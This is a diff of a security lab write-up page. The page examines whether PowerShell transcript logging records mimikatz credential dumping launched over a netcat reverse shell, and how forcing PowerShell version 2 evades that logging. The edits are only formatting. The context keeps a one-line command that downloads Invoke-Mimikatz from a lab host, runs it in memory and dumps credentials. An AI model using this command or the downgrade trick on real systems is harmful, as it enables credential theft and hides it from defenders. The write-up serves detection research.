@@ -54,7 +54,7 @@ This could be fixed by amending the PS profile so that the the transcript gets s
 
 ### Empty Transcript - Weird
 
-Below shows three windows stacked - top to bottom: 
+Below shows three windows stacked - top to bottom:
 
 1. Attacker's console via a netcat reverse shell using cmd.exe, issuing a command to dump credentials with mimikatz powershell script. Note how it says that the transcript was started and the mimikatz output follows;
 2. **Empty \(!\)** transcript logging file transcript.txt on the victim system;
@@ -62,8 +62,8 @@ Below shows three windows stacked - top to bottom:
 
 ![](../../.gitbook/assets/pwdump-transcript-empty.png)
 
-As can be seen from the above screenshot, the transcript.txt is empty although mimikatz ran successfully and dumped the credentials.   
-  
+As can be seen from the above screenshot, the transcript.txt is empty although mimikatz ran successfully and dumped the credentials.
+
 This brings up a question if I am doing something wrong or if this is a limitation of some sort in transcript logging, so I will be trying to:
 
 * dump credentials from a different process ancestry
@@ -78,7 +78,7 @@ This works as expected and the transcript.txt gets populated with mimikatz outpu
 
 ### Dumping Credentials From a Different Process Ancestry
 
-Tried dumping creds from the ancestry:   
+Tried dumping creds from the ancestry:  
 `powershell > nc > cmd > powershell` instead of `cmd > nc > cmd > powershell` - to no avail.
 
 ### Transcript Logging \#2
@@ -89,13 +89,13 @@ I have updated my Powershell version from 2.0 to 5.1 and repeated credential dum
 
 ### Back to PowerShell 2.0
 
-Even though the victim system now has Powershell 5.0 that is capable of transcript logging, we can abuse the `-version 2` switch of the powershell.exe binary like so: 
+Even though the victim system now has Powershell 5.0 that is capable of transcript logging, we can abuse the `-version 2` switch of the powershell.exe binary like so:
 
 ```bash
 powershell -version 2 IEX (New-Object System.Net.Webclient).DownloadString('http://10.0.0.5/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
 ```
 
- ... and the transcript will again become useless:
+... and the transcript will again become useless:
 
 ![](../../.gitbook/assets/pwdump-ps2-no-transcript.png)
 
@@ -139,7 +139,7 @@ I could not get sysmon to log the transcript.txt file creation event caused by t
 
 ## References
 
-{% embed url="https://attack.mitre.org/wiki/Technique/T1003" %}
+{% embed url="https://attack.mitre.org/wiki/Technique/T1003" caption="" %}
 
-{% embed url="https://www.fireeye.com/blog/threat-research/2016/02/greater\_visibilityt.html" %}
+{% embed url="https://www.fireeye.com/blog/threat-research/2016/02/greater\_visibilityt.html" caption="" %}
 
